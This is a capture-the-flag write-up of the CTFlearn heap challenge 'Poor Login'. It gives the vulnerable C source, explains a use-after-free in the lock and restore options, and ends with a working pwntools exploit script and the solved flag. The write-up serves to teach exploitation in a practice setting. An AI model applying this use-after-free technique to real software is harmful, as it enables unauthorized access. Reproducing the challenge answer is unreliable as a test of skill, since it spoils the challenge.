# Poor Login
> Write-up author: jon-brandy
## DESCRIPTION:
Heap pwning can be easy right? Here's something to look at.

nc thekidofarcrania.com 13226

## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```
┌──(brandy㉿bread-yolk)-[~/Downloads/ctflearn/poor-login/pwn-login]
└─$ file login       
login: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=304e214a790bd6fcd1ae83aa2dfd0a9cf7c8462c, not stripped
```

> BINARY PROTECTIONS

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/e898d136-c65d-4364-b696-52c0764df6e5)


2. We're given the source code, but somehow for me, I still need to decompile it to understand more about how bytes allocated on the heap and what computer reads as.
3. Reviewing the source code, the vuln is quite straight-forward, it's **Use-After-Free**.
4. We can see that there's 5 option we can use here.

> THE SOURCE CODE

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int menu() {
  printf("*** WINBLOWS LOGIN *********\n"
      "1. Login into user.\n"
      "2. Sign out.\n"
      "3. Print flag.\n"
      "4. Lock user.\n"
      "5. Restore user.\n"
      "> ");
  
  int resp = 0;
  scanf("%d", &resp);
  while (getchar() != '\n');
  return resp;
}

struct creds {
  void *padding;
  char name[32];
  int admin;
};


struct creds *curr;
struct creds *save;

char *fake_flag;

int main() {
  char buff[64];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);

  while (1) {
    switch (menu()) {
      case 1:  // Login
        curr = malloc(sizeof(*curr));

        printf("Username: ");
        fgets(curr->name, sizeof(curr->name), stdin);
        strtok(curr->name, "\n");

        curr->admin = 0;
        break;
      case 2: // Sign out
        if (!curr) {
          puts("You are not logged in!");
          break;
        }
        free(curr);
        curr = NULL;
        puts("You have been successfully logged out.");
        break;
      case 3: // Print flag
        if (curr && curr->admin) {
          puts("Here's your flag:");
          system("/bin/cat /flag.txt");
        } else {
          if (!fake_flag) {
            puts("You are not admin. Would you like to create a new flag instead?");
            fgets(buff, sizeof(buff), stdin);
            fake_flag = strdup(buff);
          }
          printf("Here's your flag: %s", fake_flag);
        }
        break;
      case 4: // Lock user
        if (curr == NULL) {
          puts("You are not logged in!");
          break;
        }

        puts("User has been locked now.");
        save = curr;
        break;
      case 5: // Restore user
        if (curr != NULL) {
          puts("You are already logged. Sign out first!");
        } else if (save == NULL) {
          puts("No user is currently locked!");
        } else {
          printf("Welcome back, %s!\n", save->name);
          curr = save;
          save = NULL;
        }
        break;
      default:
        puts("Invalid choice");
    }
  }
}
```

5. The 1st option it allocates `*curr` onto the heap with a size-field of 48.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/a486ee80-86eb-4f51-8e2b-f15083ba9f72)


6. Then we prompted to input a username which shall stored in `curr->name`.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/3d718cca-9db1-4fa7-99f7-2901c8089c29)


7. The 2nd option, is free `curr` and set it to NULL. 

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/036e8456-1805-4fbe-848d-32c3d1de5df3)


8. The 3rd option checks whether `curr` is not null and `curr->admin` is not 0, then flag shall printed out. If those conditions not fulfilled, hence it asks us to input buffer, then a global variable named `fake_flag` shall allocated on the heap with the same size as our previous input.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/54ed4d0b-09c5-4fa7-bf4c-b1fef9edd0f0)


9. At this point, it's quite clear the vuln should be at the strdup() call.
10. The 4th option, is to copy what stored in `curr` to `save`.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/8e882d15-f183-409e-bbee-cb9be34411ae)


11. The 5th option is to copy what's inside `save` to `curr`, then set `save` to NULL.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/9985029d-2ea7-4bc8-9de9-3085a2f5b9f9)


12. It's all because there's a vulnerable optiTon at number 4 and 5, remembering if we choose to free chunk stored in `curr` it shall set to NULL too (which is secure). But we can stored it first before freed to another struct named `save` which has the same member as `curr` struct, afterwards recover the same pointer.
13. Anyway things to note here, in order **Use-After-Free** to succeed, at the 3rd option we need to input the same size as the 1st option (which is 48 bytes). This would make malloc reuse the released chunk (before).

> PROOF
```
Let's run option 1 then input 8 chars. Here's the result.
```

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/97715599-89ce-47c2-a265-10eae477bb59)

```
Noticed the metadata is 0x40 which indicates it has 64 size-field. It mallocs 40 (based from ghidra).
Now let's store it to save by run option 4, then free it and run option 3 again and enters the same size-field as curr (40).
```

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/8fda7c67-f503-4df0-a9ec-65b7a00d6ae5)

```
As you can see, it overlaps our previous chunk. Let's do another POC if we input smaller size, malloc shoud allocate below it.
```

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/953a6b18-050c-4f29-9a42-f2267cd2dd63)


14. Great! It's proven now. The problem now is how to trigger `curr->admin != 0`??
15. No need to worry, if we already done the previous step, `curr->admin` shall set to other than 0.
16. Hence we just need to choose option 5 then option 3 to get the flag.
17. To summarize it, the flow is option **1 - 4 - 2 - 3 - 5 - 3**.

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/5ff0aa66-3ee6-416c-8db0-e20d7101a16a)


18. Awesome! Here's the full script.

> SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
# nc thekidofarcrania.com 13226
gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './login'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

def login(buffer):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{buffer}')

def sign_out():
    sh.sendlineafter(b'>', b'2')

def print_flag():
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b'?', b'A' * 0x30) # 48 (allocate the same chunk as the 1st one)

def lock_user():
    sh.sendlineafter(b'>', b'4')

def restore_user():
    sh.sendlineafter(b'>', b'5')

sh = start()

login(b'AABBCCDD')
lock_user()
sign_out()
print_flag()
restore_user()

sh.sendlineafter(b'>', b'3')

sh.interactive()
```

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/c6204a4a-334f-49f2-8e09-cab947a6afe2)


19. Got the flag!

## FLAG

```
CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
```
